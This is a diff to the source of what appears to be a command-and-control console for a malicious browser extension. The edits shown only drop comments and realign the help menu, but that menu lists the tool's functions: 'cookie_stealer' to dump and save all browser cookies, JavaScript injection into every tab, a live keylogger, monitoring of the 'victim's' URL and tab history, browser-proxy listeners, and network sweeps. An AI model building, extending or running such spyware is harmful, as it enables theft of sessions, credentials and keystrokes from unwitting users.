@@ -767,7 +767,6 @@ ACTIVE_TAB = {
 }
 TAB_HISTORY_MAX = 50
 
-# Fix #1: preload expiration (seconds)
 PRELOAD_TTL = 300
 
 CONN_STATE = {
@@ -779,7 +778,6 @@ CONN_STATE = {
     'client_ip':   None,
 }
 
-# Fix #2: thread-safe output queue for background messages
 OUTPUT_QUEUE = queue.Queue()
 
 
@@ -1643,29 +1641,29 @@ def print_help():
   {GREEN}head {CYAN}<url>{RESET}                         HEAD request (headers only)
   {GREEN}save {CYAN}<filename>{RESET}                    Save last response body to file
   {GREEN}scan {CYAN}<base_url> <port1,port2,...>{RESET}  Scan ports via HTTP
-  {GREEN}sweep {CYAN}<cidr_base> <start> <end>{RESET}   HTTP sweep IPs (e.g. sweep 10.0.0 1 50)
-  {GREEN}status{RESET}                              Connection health check
+  {GREEN}sweep {CYAN}<cidr_base> <start> <end>{RESET}    HTTP sweep IPs (e.g. sweep 10.0.0 1 50)
+  {GREEN}status{RESET}                             Connection health check
   {GREEN}preload {CYAN}<url>{RESET}                      Queue a GET task before extension connects
 
 {BOLD}Listeners (browser proxy):{RESET}
   {GREEN}add_listener {CYAN}<port>{RESET}                Start HTTP proxy on local port
-  {GREEN}listeners{RESET}                           List active proxy listeners
-  {GREEN}rm_listener {CYAN}<id>{RESET}                  Remove a proxy listener
+  {GREEN}listeners{RESET}                          List active proxy listeners
+  {GREEN}rm_listener {CYAN}<id>{RESET}                   Remove a proxy listener
 
 {BOLD}Extraction:{RESET}
-  {GREEN}cookie_stealer{RESET}                      Dump all browser cookies
+  {GREEN}cookie_stealer{RESET}                     Dump all browser cookies
   {GREEN}save_cookies {CYAN}<filename>{RESET}            Save last stolen cookies to JSON file
 
 {BOLD}Injection:{RESET}
-  {GREEN}inject_javascript {CYAN}<file.js>{RESET}       Execute local JS file in all browser tabs
-  {GREEN}injection_keylogger{RESET}                 Live keylogger (Enter x3 to stop)
+  {GREEN}inject_javascript {CYAN}<file.js>{RESET}        Execute local JS file in all browser tabs
+  {GREEN}injection_keylogger{RESET}                Live keylogger (Enter x3 to stop)
 
 {BOLD}Monitoring:{RESET}
-  {GREEN}url{RESET}                                 Show victim's current URL
-  {GREEN}tab_history{RESET}                         Show browsing history for this session
+  {GREEN}url{RESET}                                Show victim's current URL
+  {GREEN}tab_history{RESET}                        Show browsing history for this session
 
-  {GREEN}help{RESET}                                Show this help
-  {GREEN}exit{RESET}                                Quit
+  {GREEN}help{RESET}                               Show this help
+  {GREEN}exit{RESET}                               Quit
 """)
 
 
@@ -1896,7 +1894,6 @@ def handler_loop():
                 saved = False
                 with LOCK:
                     for k, v in list(RESULT_STORE.items()):
-                        # Fix #1: preloads are now (bytes, timestamp) tuples
                         if isinstance(k, str) and k.startswith('preload_') and isinstance(v, tuple):
                             body_bytes = v[0]
                             with open(fname, 'wb') as f:
